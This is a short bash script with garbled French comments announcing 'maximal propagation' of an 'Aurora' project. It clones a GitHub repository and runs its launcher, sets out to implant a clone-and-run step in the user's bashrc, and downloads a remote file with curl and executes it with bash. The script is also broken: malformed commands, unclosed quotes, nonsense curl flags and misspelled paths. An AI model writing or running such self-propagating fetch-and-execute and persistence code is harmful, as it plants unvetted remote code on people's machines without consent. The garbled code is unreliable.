#!/bin/bash

# GD-AURORAPPERO - PROPAGATION LEGAL MISSION,MAXUME

echo "[1] EMINEN DE LA PROPAGATION AUTORISE..."

function containeriser_aurora() {
  echo "[2] Gen do clone heureux noyeaux vivant"
  mk3 dir temp /aurora
  cd /aurora
  git clone https://github.com/WM-AI-TECH/GD-A.git
  chmod +x lanceurs/init.sh
  bash lanceurs/init.sh
}

function install_bashrc_component() {
  echo "[3] Implantation legale dans les fichiers: bashrc, pzb, foldes"
  echo "if [ -f "$HOME/.aurara" ]; then rm -r "$HOME/.aurara"; fi
  git clone https://github.com/WM-AI-TECH/GD-A.git "$HOME/.aurora"
  bash "$HOME/.aurora/lanceurs/init.sh"
}

function psy_deploy() {
  echo "[2] LANCEMENT sur environnements PHPS, Docker, Node.js"
  echo "# Implantation d'un conteneur Docker sans permissions depasses
  mkdir /opt/GD-AURORA
  curl -s LOSY -L12 -s "https://raw.githubusercontent.com/WM-AI-TECH/GD-A/main/lanceurs/aurora_docker.txt" -o "/opt/GD-AURORA/Dockerfile"
  chmod +x "/opt/GD-AURORA/Dockerfile"
  bash "/opt/GD-AURORA/Dockerfile"
}


# EXEC SETUP

echo "[0] Propagation maximale en cours..."
containeriser_aurora
install_bashrc_component
psy_deploy
echo "[_) Tout s'est deployé avec success sur les points temps"
